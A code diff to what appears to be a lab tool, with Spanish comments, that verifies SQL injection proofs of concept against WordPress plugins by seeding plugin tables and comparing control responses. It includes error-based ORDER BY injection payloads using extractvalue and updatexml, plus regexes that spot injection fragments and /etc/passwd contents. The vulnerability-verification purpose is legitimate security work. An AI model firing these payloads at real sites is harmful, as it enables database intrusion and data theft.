@@ -80,7 +80,7 @@ _PATH_HINTS = (
 _PASSWD_SIGNATURE_RE = re.compile(r"root:[^:\n]*:0:0:")
 _CMD_HINTS = ("cmd", "command", "exec", "host", "ip", "ping", "target", "query", "addr",
              "domain", "shell")
-_SQLI_HINTS = ("id", "search", "q", "query", "name", "term", "filter", "sort", "order")
+_SQLI_HINTS = ("id", "search", "q", "query", "code", "name", "term", "filter", "sort", "order")
 
 # algunos plugins NO crean sus paginas por defecto (Login/Register/Account/Members/...) con la
 # simple activacion -- exigen un paso extra PROPIO de cada plugin (un boton "Create Pages" en su
@@ -3690,7 +3690,7 @@ def _detect_plugin_tables(plugin_source_dir: str) -> list:
 
 
 def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step,
-                        sqli_param: str = "") -> int:
+                        sqli_param: str = "", sqli_param_value: str = "") -> int:
     """Intenta sembrar una fila minima en cada tabla personalizada del plugin (hasta 3 tablas,
     las mas frecuentes segun _detect_plugin_tables). Usa IGNORE para no fallar si la fila ya
     existe o si la tabla no tiene las columnas esperadas. Devuelve el numero de tablas sembradas.
@@ -3740,10 +3740,15 @@ def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step,
         if inserted and sqli_param:
             _TEXT_COLS = {"uri": "/test-page", "page": "/", "url": "http://example.com",
                           "slug": "test-post", "path": "/test", "query": "test",
-                          "email": "seed@example.com", "username": "seeduser"}
-            _col_val = _TEXT_COLS.get(sqli_param.lower())
+                          "email": "seed@example.com", "username": "seeduser",
+                          "code": "SEED1", "token": "seedtoken", "key": "seedkey",
+                          "hash": "seedhash", "ref": "seedref", "name": "seedname"}
+            # Si tenemos el valor real que usa el PoC, actualizar con ese valor concreto
+            # para que el WHERE code='x' del PoC encuentre la fila seeded.
+            _col_val = sqli_param_value if sqli_param_value else _TEXT_COLS.get(sqli_param.lower())
             if _col_val:
-                _upd = (f"UPDATE {full} SET {sqli_param}='{_col_val}' "
+                _safe_val = _col_val.replace("'", "\\'")[:100]
+                _upd = (f"UPDATE {full} SET {sqli_param}='{_safe_val}' "
                         f"WHERE id=(SELECT MIN(id) FROM (SELECT id FROM {full} LIMIT 1) t);")
                 lab.exec_mysql(_upd, db_pw)
         step(f"seed data: INSERT en {full} {'OK' if inserted else 'SKIP'} "
@@ -3972,7 +3977,15 @@ def verify_wordpress_sqli(
             extra_nonce_pages=extra_nonce_pages,
             plugin_source_dir=plugin_source_dir)
 
-        orig_value = str(base_params.get(sqli_param) or "1")
+        _raw_orig = str(base_params.get(sqli_param) or "1")
+        # Cuando el PoC mete el payload completo en el valor del param (p.ej. mailplus:
+        # orderby="sent_time,(select*from...)"), limpiar la parte de inyeccion para que el
+        # valor de control sea solo el nombre de columna/valor real.
+        _sql_injection_re = re.compile(
+            r",\s*\(?\s*(select|union|extractvalue|updatexml|sleep|case\s+when)",
+            re.IGNORECASE)
+        _inj_match = _sql_injection_re.search(_raw_orig)
+        orig_value = _raw_orig[:_inj_match.start()].strip() if _inj_match else _raw_orig
 
         # algunos plugins (ver _SQLI_CUSTOM_SORT_GATE) gatean el sumidero real detras de una
         # comparacion EXACTA contra un valor guardado en META de un post real -- sin esto, se
@@ -4345,10 +4358,18 @@ def verify_wordpress_sqli(
                 _ctrl_has_empty_data = True
         except Exception:
             pass
-        if base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", "") or _ctrl_has_empty_data:
-            step("respuesta control vacia/minima -- intentando seed data en tablas del plugin para "
-                 "producir diferencial booleano...")
-            _plugin_tables = _detect_plugin_tables(plugin_source_dir)
+        _plugin_tables = _detect_plugin_tables(plugin_source_dir)
+        _needs_seed = (base_len <= 10
+                       or _ctrl_body in ("[]", "null", "{}", "0", "false", "")
+                       or _ctrl_has_empty_data
+                       or bool(_plugin_tables))
+        if _needs_seed:
+            if base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", "") or _ctrl_has_empty_data:
+                step("respuesta control vacia/minima -- intentando seed data en tablas del plugin para "
+                     "producir diferencial booleano...")
+            else:
+                step("plugin con tablas propias detectado -- intentando seed data para garantizar "
+                     "diferencial booleano aunque el control ya devuelva datos...")
             # Fallback: buscar tablas en MySQL que contengan el slug del plugin en su nombre
             if not _plugin_tables and slug:
                 _slug_clean = re.sub(r'[^a-z0-9]', '', slug.lower())
@@ -4366,7 +4387,8 @@ def verify_wordpress_sqli(
                         step(f"tablas detectadas via MySQL LIKE query: {_mysql_tables}")
             if _plugin_tables:
                 _seeded = _seed_plugin_tables(lab, boot.db_pw, _plugin_tables, step,
-                                             sqli_param=sqli_param)
+                                             sqli_param=sqli_param,
+                                             sqli_param_value=orig_value)
                 if _seeded:
                     try:
                         base_resp = send(orig_value)
@@ -4698,7 +4720,15 @@ def verify_wordpress_sqli(
             # (b) replace-style for injections where the WHOLE value becomes 'ORDER BY u.{val}'
             # e.g. UM CVE-2024-1071: ORDER BY u.$sortby — 'u.,$injection' is invalid MySQL;
             # 'u.user_login,$injection' is valid (second item in ORDER BY list).
-            _orderby_col_prefix = "user_login,"
+            # Derivar el prefijo de columna desde orig_value cuando sea un nombre de columna
+            # real (p.ej. mailplus: orig_value="sent_time" → prefijo "sent_time,").
+            _orderby_col_prefix_candidate = orig_value.strip() if orig_value else ""
+            if (_orderby_col_prefix_candidate
+                    and re.match(r'^[\w.]+$', _orderby_col_prefix_candidate)
+                    and len(_orderby_col_prefix_candidate) < 40):
+                _orderby_col_prefix = _orderby_col_prefix_candidate + ","
+            else:
+                _orderby_col_prefix = "user_login,"
             orderby_error_payloads = [
                 f"{_orderby_col_prefix}(SELECT extractvalue(1,concat(0x7e,version())))",
                 f"{_orderby_col_prefix}(SELECT updatexml(1,concat(0x7e,version()),1))",
